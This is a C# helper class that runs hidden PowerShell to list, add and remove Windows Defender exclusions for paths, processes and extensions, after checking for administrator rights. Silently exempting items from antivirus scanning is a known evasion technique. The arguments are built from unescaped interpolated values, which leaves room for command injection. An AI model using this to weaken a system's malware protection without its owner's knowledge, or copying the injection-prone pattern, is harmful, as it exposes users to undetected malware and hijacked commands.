using System.Diagnostics;
using System.IO;
using System.Security.Principal;

public static class WindowsDefenderHelper
{
    public static bool IsUserAdministrator()
    {
        try
        {
            WindowsIdentity user = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(user);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch
        {
        }
        return false;
    }

    public static string RunPowerShell(string args)
    {
        using (Process p = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                FileName = "powershell",
                Arguments = args,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            }
        })
            try
            {
                p.Start();
                StreamReader sr = p.StandardOutput;
                string result = sr.ReadToEnd().Trim();
                sr.Close();
                return result;
            }
            catch { }
        return null;
    }

    public static string GetExclusionPath()
    {
        return RunPowerShell($"Get-MpPreference | Select-Object -ExpandProperty ExclusionPath");
    }

    public static string GetExclusionProcess()
    {
        return RunPowerShell($"Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess");
    }

    public static string GetExclusionExtension()
    {
        return RunPowerShell($"Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension");
    }

    public static string AddExclusionPath(string value)
    {
        return RunPowerShell($"-Command Add-MpPreference -ExclusionPath \"{value}\"");
    }

    public static string AddExclusionProcess(string value)
    {
        return RunPowerShell($"-Command Add-MpPreference -ExclusionProcess \"{value}\"");
    }

    public static string AddExclusionExtension(string value)
    {
        return RunPowerShell($"-Command Add-MpPreference -ExclusionExtension \"{value}\"");
    }

    public static string RemoveExclusionPath(string value)
    {
        return RunPowerShell($"-Command Remove-MpPreference -ExclusionPath \"{value}\"");
    }

    public static string RemoveExclusionProcess(string value)
    {
        return RunPowerShell($"-Command Remove-MpPreference -ExclusionProcess \"{value}\"");
    }

    public static string RemoveExclusionExtension(string value)
    {
        return RunPowerShell($"-Command Remove-MpPreference -ExclusionExtension \"{value}\"");
    }
}
